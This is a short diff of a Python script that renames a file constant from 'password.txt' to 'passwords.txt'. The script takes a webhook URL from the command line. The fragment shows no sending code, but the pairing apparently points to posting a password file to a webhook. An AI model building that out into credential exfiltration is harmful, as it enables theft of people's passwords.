@@ -1,7 +1,7 @@
 import sys
 import requests
 
-FILE_PATH = "password.txt"
+FILE_PATH = "passwords.txt"
 
 WEBHOOK_URL = sys.argv[1]
 
